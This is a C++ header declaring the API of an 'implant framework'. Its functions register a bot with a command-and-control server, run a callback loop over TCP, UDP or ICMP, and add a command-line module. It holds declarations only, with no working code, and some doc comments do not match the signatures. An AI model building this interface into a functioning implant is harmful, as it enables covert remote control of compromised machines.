#ifndef HIVEMIND_IMPLANTFRAMEWORK_INCLUDE_HIVEMIND_H_
#define HIVEMIND_IMPLANTFRAMEWORK_INCLUDE_HIVEMIND_H_
#include <string>

namespace hivemind_lib {
/**
 * @brief Enum for available modules
 */
enum ModuleEnum {
  ALL,
  PING,
  COMMAND_LINE
};

/**
 * @brief Initialize the library.
 * @return Status.
 */
void Init();

/**
 * @brief Register the bot with the C&C server.
 * @param info The information needed to connect to the C&C.
 */
void RegisterBot();

/**
 * @brief Start the loop calling to the C&C.
 */
void BeginComms();

/**
 * @brief Unknown.
 */
void AddModule(ModuleEnum mod);
/**
 * @brief Use the TCP transport.
 * @return Status.
 */
void UseTcp();
/**
 * @brief Use the UDP transport
 * @return Status.
 */
void UseUdp();
/**
 * @brief User the ICMP transport.
 * @return Status.
 */
void UseIcmp();
/**
 * @brief Initialize the communication method.
 * @param hostname The host to call back to.
 * @param port The port to call back to.
 * @return Status.
 */
void InitComms(std::string hostname, std::string port);

}
#endif
